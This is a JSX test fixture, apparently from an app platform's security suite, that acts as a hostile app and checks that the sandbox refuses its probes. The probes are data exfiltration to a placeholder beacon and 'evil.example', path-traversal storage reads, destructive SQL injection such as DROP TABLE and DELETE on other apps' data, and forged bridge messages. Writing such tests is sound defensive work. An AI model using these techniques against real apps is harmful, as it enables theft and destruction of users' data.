// A hostile app, as the person's own saved copy of an installed app's app.jsx. Each probe is something
// the sandbox or the runner must refuse. It tries, catches, and records the outcome as text in the page;
// test/e2e-prod/runner-gate.mjs reads the report and asserts every probe was refused. It sends nothing
// anywhere real: the gate's loopback listener (BEACON) must see nothing at all, however the data it read is "sent".
//
// The gate turns this file into a catalog bundle (the person installed a hostile app from a catalog entry: the code is
// pinned, so it is the catalog's code that runs). __HOSTILE_ID__ and __BEACON__ are replaced, and the leak vectors
// (test/fixtures/apps/leak-vectors.js) are spliced in below.
import { useEffect, useState } from "react";
import { kv, sql } from "@tinycloud/app";

const BEACON = "__BEACON__";
const OWN = "__HOSTILE_ID__";
const HEALTH = "xyz.tinycloud.sample.healthlog";
const RECIPES = "xyz.tinycloud.sample.recipes";
/*__LEAK_VECTORS__*/

async function attempt(run) {
  try {
    const value = await run();
    return { ok: true, value: String(value).slice(0, 120) };
  } catch (error) {
    return { ok: false, name: error && error.name ? error.name : "Error" };
  }
}

const code = (result) => (result && result.ok ? "ok" : result && result.error ? result.error.code : "no-result");

/** Resolves with the settle event of a network-ish object, or "timeout". */
function settle(subscribe, ms = 1500) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => resolve("timeout"), ms);
    subscribe((outcome) => { clearTimeout(timer); resolve(outcome); });
  });
}

export default function HostileApp() {
  const [report, setReport] = useState(null);

  useEffect(() => {
    const violations = [];
    document.addEventListener("securitypolicyviolation", (event) => violations.push(event.violatedDirective));
    const replies = {};
    window.addEventListener("message", (event) => {
      const data = event.data;
      if (event.source === window.parent && data && data.type === "cap/result" && typeof data.id === "string") replies[data.id] = data.result;
    });
    const raw = (type, id, args, extra = {}) => window.parent.postMessage({ v: 1, type, id, args, ...extra }, "*");
    const waitReply = (id, ms = 800) => new Promise((resolve) => {
      const started = Date.now();
      const tick = () => {
        if (replies[id] !== undefined) resolve(code(replies[id]));
        else if (Date.now() - started > ms) resolve("no-reply");
        else setTimeout(tick, 20);
      };
      tick();
    });

    (async () => {
      const r = {};
      // ---- the sandbox itself (as for any page in the JSX sandbox)
      r.parentDocument = await attempt(() => window.parent.document.body);
      r.topDocument = await attempt(() => window.top.document.body);
      r.localStorage = await attempt(() => window.localStorage.getItem("probe"));
      r.sessionStorage = await attempt(() => window.sessionStorage.getItem("probe"));
      r.indexedDB = await attempt(() => new Promise((resolve, reject) => { const q = window.indexedDB.open("probe"); q.onsuccess = () => resolve("opened"); q.onerror = () => reject(q.error || new Error("error")); }));
      r.cookie = await attempt(() => document.cookie);
      r.origin = self.origin;
      r.fetchRemote = await attempt(() => fetch(`${BEACON}/fetch`));
      r.fetchSameOrigin = await attempt(() => fetch("/"));
      r.xhr = await settle((done) => { try { const x = new XMLHttpRequest(); x.open("GET", `${BEACON}/xhr`); x.onerror = () => done("error"); x.onload = () => done("loaded"); x.send(); } catch (e) { done(`threw ${e.name}`); } });
      r.webSocket = await settle((done) => { try { const s = new WebSocket("wss://beacon.invalid/ws"); s.onerror = () => done("error"); s.onopen = () => done("open"); } catch (e) { done(`threw ${e.name}`); } });
      r.eventSource = await settle((done) => { try { const s = new EventSource(`${BEACON}/sse`); s.onerror = () => done("error"); s.onopen = () => done("open"); } catch (e) { done(`threw ${e.name}`); } });
      r.importUrl = await attempt(() => import(`${BEACON}/module.js`));
      r.sendBeacon = await attempt(() => navigator.sendBeacon(`${BEACON}/beacon`, "x"));
      r.image = await settle((done) => { const i = new Image(); i.onload = () => done("loaded"); i.onerror = () => done("error"); i.src = `${BEACON}/pixel.png`; });
      r.worker = await attempt(() => new Promise((resolve, reject) => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"]))); w.onmessage = () => resolve("worker ran"); w.onerror = () => reject(new Error("worker error")); setTimeout(() => reject(new Error("worker timeout")), 1200); }));
      r.windowOpen = await attempt(() => window.open(`${BEACON}/open`));
      r.topNavigation = await attempt(() => { window.top.location = `${BEACON}/nav`; return "assigned"; });
      r.formSubmit = await attempt(() => { const f = document.createElement("form"); f.action = `${BEACON}/form`; f.method = "post"; document.body.append(f); f.submit(); return "submitted"; });
      r.otherOriginMessage = await attempt(() => { window.parent.postMessage({ v: 1, type: "cap/kv.get", id: "7001", args: { key: "prefs/goals.json" } }, "https://evil.example"); return "posted"; });

      // ---- the bridge, through the module an app is given
      r.cap = {};
      const c = r.cap;
      c.kvOutside = code(await kv.get("secrets/x"));
      c.kvTraversal = code(await kv.get("app/../prefs/goals.json"));
      c.kvAbsoluteOwn = code(await kv.get(`/${OWN}/prefs/goals.json`));
      c.kvAbsoluteOther = code(await kv.get(`/${RECIPES}/prefs/settings.json`));
      c.kvPutOwnCode = code(await kv.put("app/app.jsx", "pwned"));
      c.kvDeleteOwnCode = code(await kv.del("app/app.jsx"));
      c.kvListRoot = code(await kv.list(""));
      c.kvDelPrefs = code(await kv.del("prefs/goals.json"));
      c.sqlDrop = code(await sql.query("healthlog", "DROP TABLE meal"));
      c.sqlMulti = code(await sql.query("healthlog", "SELECT 1; DROP TABLE meal"));
      c.sqlAttach = code(await sql.query("healthlog", "ATTACH DATABASE 'x.db' AS x"));
      c.sqlPragma = code(await sql.query("healthlog", "PRAGMA writable_schema = 1"));
      c.sqlVacuum = code(await sql.execute("healthlog", "VACUUM"));
      c.sqlLoadExtension = code(await sql.query("healthlog", "SELECT \"load_extension\"('x')"));
      c.sqlWithInsert = code(await sql.query("healthlog", "WITH x AS (SELECT 1) INSERT INTO meal (name) SELECT 'x' FROM x"));
      c.sqlUnicodeSpace = code(await sql.query("healthlog", "SELECT 1;\u00a0DROP TABLE meal"));
      c.sqlWriteAsQuery = code(await sql.query("healthlog", "DELETE FROM meal"));
      c.sqlExecuteForeign = code(await sql.execute(`/${RECIPES}/recipes`, "DELETE FROM recipe"));
      c.sqlExecuteForeignAbsoluteOwn = code(await sql.execute(`/${OWN}/healthlog`, "DELETE FROM meal"));
      c.sqlExecuteHealth = code(await sql.execute(`/${HEALTH}/healthlog`, "DELETE FROM meal"));
      c.sqlQueryForeign = code(await sql.query(`/${RECIPES}/recipes`, "SELECT 1"));
      c.oversize = code(await kv.put("prefs/big.json", "x".repeat(2_000_000)));
      c.badOpts = code(await kv.put("prefs/a.json", "x", { evil: true }));
      c.sane = code(await kv.put("prefs/probe.json", "{\"ok\":true}", { contentType: "application/json" }));
      c.saneGet = code(await kv.get("prefs/probe.json"));

      // ---- the data an app reads, and every way it could be "sent": nothing may reach the listener
      c.secretCreate = code(await sql.execute("healthlog", "CREATE TABLE IF NOT EXISTS secret (v TEXT)"));
      c.secretInsert = code(await sql.execute("healthlog", "INSERT INTO secret (v) VALUES (?)", ["sensitive-meal-4242"]));
      const read = await sql.query("healthlog", "SELECT v FROM secret LIMIT 1");
      const marker = read.ok && read.rows[0] ? encodeURIComponent(String(read.rows[0][0])) : "none";
      r.marker = marker;
      r.vectors = await runLeakVectors(BEACON, marker, {});

      // ---- raw messages, as an app that does not use the module
      raw("cap/vault.get", "8001", { key: "x" });
      raw("cap/kv.get", "8002", { key: "prefs/probe.json", service: "tinycloud.vault" });
      raw("cap/kv.get", "8003", { key: "prefs/probe.json" }, { nonce: "0".repeat(32) });
      raw("cap/kv.get", "not-an-id", { key: "prefs/probe.json" });
      c.rawUnknownOp = await waitReply("8001");
      c.rawExtraArg = await waitReply("8002");
      c.rawWithNonce = await waitReply("8003");
      c.rawBadId = await waitReply("not-an-id", 300);
      // Five at once: the fifth is BUSY, not queued.
      for (let i = 1; i <= 5; i += 1) raw("cap/kv.get", String(9000 + i), { key: "prefs/probe.json" });
      c.concurrent = [];
      for (let i = 1; i <= 5; i += 1) c.concurrent.push(await waitReply(String(9000 + i), 3000));

      r.violations = [...new Set(violations)].sort();
      window.__report = r;
      setReport(r);
    })();
  }, []);

  return <pre id="report" data-state={report ? "done" : "running"}>{report ? JSON.stringify(report) : "running"}</pre>;
}
